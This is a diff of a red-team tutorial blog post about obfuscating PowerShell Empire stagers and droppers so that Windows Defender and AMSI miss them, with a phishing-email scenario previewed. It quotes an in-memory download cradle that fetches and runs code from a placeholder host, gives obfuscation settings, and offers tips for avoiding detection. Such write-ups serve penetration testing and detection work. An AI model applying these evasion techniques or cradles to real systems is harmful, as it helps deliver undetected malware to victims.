@@ -7,7 +7,7 @@ category: blog
 ---
 
 Hello again :).<br/> 
-It took me more than I ancipated for writing the second part. The guys from BC-Security announced on 4th April 2020 that they have made Empire's stager undetectable. Microsoft did not wait to see Empire being used in the wild and updated the Windows Defender with new signatures against our dear Empire stagers. In what will follow, I will show how to apply what we learnt in the first <a href="https://whmacmac.github.io/RedTeam_Exercises_with_OpenSource_Tools_Part_1" style="text-decoration: none;">part</a> of my article.
+It took me more than I ancipated for writing the second part. The guys from BC-Security announced on 4th April 2020 that they have made Empire's stager undetectable. Microsoft did not wait to see Empire being used in the wild and updated the Windows Defender with new signatures against our dear Empire's stagers. In what will follow, I will show how to apply what we learnt in the first <a href="https://whmacmac.github.io/RedTeam_Exercises_with_OpenSource_Tools_Part_1" style="text-decoration: none;">part</a> of my article.
 
 ## Contents
 * [Intro scenarios](#shortintro)
@@ -16,14 +16,14 @@ It took me more than I ancipated for writing the second part. The guys from BC-S
 
 ## Intro scenarios {#shortintro}
 
-I finished the first part promising that I will apply the theory on some real world cases. Without other words let's see what scenarios I will approach:
+I finished the first part promising that I will apply the theory on some real world cases. Without other words, let's see what scenarios I will approach:
 <ul>
 <li>Scenario 1: I consider I already obtained somehow access in the network via a service exploit, web application vulnerability or through a phishing email. I will explore some ways of upgrading the dumb shell without being detected by WindowsDefender.</li>
  <li>Scenario 2: I was speaking about a RedTeam exercise in my first article, am I right? What RedTeam Exercise is that where I don't make use of a little phishing mail? I will build from 0 a phishing email where I will explore anti-sandbox techniques.</li>
 </ul>
 
-I considered that we all encountered situations where we were limited by a dumb shell and we could not upgrade it because of not taking all the necessary measures against a security sollution. Also I personally, I found myself in the situation where only through a phishing email I could access the target's network.<br/>
-I wanted to develop a simple malware that will use the multi stager feature of the Empire framework. I want from start that all what I will present, fits on the real world scenarios.<br/>
+I considered that we all encountered situations where we were limited by a dumb shell. We could not upgrade it because of not taking all the necessary measures against a security solution. I found myself in the situation where I could access the target's network only through a phishing email.<br/>
+I wanted to develop a simple malware that it uses the multi stager feature of the Empire framework. I want from start that all what I will present, fits on the real world scenarios. <b>Also all what i show you is just in education purposes. Do not apply outside of your network.</b><br/>
 Lets speak a bit about how our phishing mail from the 2nd scenario will look, how I was thinking its arhitecture, what difficulties I am expecting to encounter during its delivery or execution. 
 
 <ul>
@@ -41,12 +41,12 @@ All of the mentioned phases are finding in the below scheme.
  </center>
 </div>
 
-If you are wondering where is the scheme for the first scenario, I am answering you that it is using the same code as the second scenario, starting from 5th phase. This first scenario is a pre-requisite for having an operationable phishing email.
+If you are wondering where is the scheme for the first scenario, I am answering you that it is using the same code as the second scenario, starting from 5th phase. This first scenario is a pre-requisite for having an operational phishing email.
 
-In order to bypass Windows Defender and AMSI rules, I divided my testing work in half: one for testing the stager's evasion capabilities for not being detected and the second part for testing and developing anti-sandbox features and a way to bypass the Office's sandbox mode. 
+I divided my testing work in half in order to bypass Windows Defender and AMSI rules: one for testing the stager's evasion capabilities for not being detected. The second part is focused testing and developing anti-sandbox features and a way to bypass the Office's sandbox mode. 
 
 ## Scenario 1 {#scenario1}
-I will not show all the tests that I did in order to observe and analyze Windwos Defender and AMSI rules. In my examples, I am using multi/launcher stager.<br/>
+I will not show all the tests that I did in order to observe and analyze the Windwos Defender's behavior and the AMSI rules. In my examples, I am using multi/launcher stager.<br/>
 In the first scenario I consider I already obtained somehow access in the network via a service exploit, web application vulnerability or through a phishing email.<br/>
 
 As I said in the first part, if you are using Empire with default config, it will be catched by Windows Defender. It can not pass the system protections so obfuscation or changes are needed.
@@ -86,6 +86,8 @@ set ObfuscateCommand AST\SCRIPTBLOCKAST\1, Encoding\1
 
 {% endhighlight %}
 
+Microsoft anticipated only a limited number of custom combination using Invoke-Obfuscation. Take your time and do more complex custom combinations. Keeping in mind to not break the limit.
+
 <b>4. Suspicious key words</b><br/>
 It is well known that some powershell arguments were abused in the last years ... If you are working as a blue teamer, I am pretty sure you know which are these "widely used" arguments in attacks:
 
@@ -97,7 +99,7 @@ It is well known that some powershell arguments were abused in the last years ..
  <li>encodedcommand – indicates the following chunk of text is a base64 encoded command.</li> 
  </ul>
 
-Empire's stager (multi/launcher) is coming with encodedcommand enabled as default. Besides this, the empire's listeners (HTTP listener) is using all of the above arguments as part of the launcher syntax. When they are used together, most likely there is something suspicious.
+The Empire's stager (multi/launcher) is coming with the 'encodedcommand' command as enabled by default. Besides this, the empire's listeners (HTTP listener) is using all of the above arguments as part of the launcher syntax. When they are used together, most likely there is something suspicious. Use only 'noninteractive' or '-windowsstyle hidden' if it is needed.
 
 <div>
 <center><img src="/images/2020-04-16-RedTeam-Exercises-with-OpenSource-Tools-Part-2.md/launcher.png">
@@ -107,13 +109,15 @@ Empire's stager (multi/launcher) is coming with encodedcommand enabled as defaul
 I recommend to turn base64 off. It doesn't add anything to your obfuscation while trying to avoid Defender. It's really just used because it's the easiest way to handle sending the command in a string. Once you have your obfuscated code you can re-encode it if you really want to use this method. <br/>
 Most security related solutions created features for detecting base64 encoded strings and analyzing them after the content is decoded. CarbonBlack, FireEye made public their sollutions' capabilities in the past, being clear for us that the above arguments are using as a part of their detection rules: you can read more <a href="https://www.carbonblack.com/2015/08/14/how-to-detect-powershell-empire-with-carbon-black/" style="text-decoration: none;">here</a> and <a href="https://www.fireeye.com/blog/threat-research/2018/07/malicious-powershell-detection-via-machine-learning.html" style="text-decoration: none;">here</a>.  
 
-<br/>Now that I identified almost all the patterns that are triggering the Microsoft's signatures, let's speak about the dropper before starting with the demo.
+<br/><br/>Now that I identified almost all the patterns that are triggering the Microsoft's signatures, let's speak about the dropper before starting with the demo.
 
-<b> Dropper </b><br/>
+### Dropper <br/>
 Possibly many of you use the powershell command "IEX((New-Object System.Net.WebClient).downloadstring('http://something'));" for downloading in memory your payload. I worked in a SOC and I know the strings like "new-object", "Webclient", "downloadstring" are used by many for detecting suspicious events. I will make use of an open source <a href="https://github.com/danielbohannon/Invoke-CradleCrafter" style="text-decoration: none;">tool</a> made special for this kind of tasks.<br/>
 Invoke-CradleCafter is a tool special created for automating the process for making obfuscated downloaders in memory or on disk. 
 
-I invite you to take a look on it in case you are interested in using the downloader on disk. I am using the only in memory downloader.
+I am using the only in memory downloader. I invite you to take a look on it in case you are interested in using it. If you are a blue teamer, you may be interested in testing your detection capabilities of your SIEM/HIDS with Invoke-CradleCafter.
+<br/> I can also obfuscate more the dropper with Invoke-Obfuscation, for escaping the most exotic SIEM/HIDS rules but I am not doing it this time. 
+
 <div>
 <center><img src="/images/2020-04-16-RedTeam-Exercises-with-OpenSource-Tools-Part-2.md/cradle.png">
  </center>
@@ -121,9 +125,11 @@ I invite you to take a look on it in case you are interested in using the downlo
 
 <br/> Now it is the time for what you all wanting to see.
 
-<b> Demo </b><br/>
+### Demo <br/>
 My tests are done on an up-to-date Windows Pro OS with Windows Defender enabled. (all of the updates were done before filming the video - 21 April 2020).
 <iframe width="560" height="315" src="https://www.youtube.com/embed/bPnt3d7igX8" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+
+As you could see, Microsoft didn't know what hit it.
 
 ## Scenario 2 {#scenario2}
 
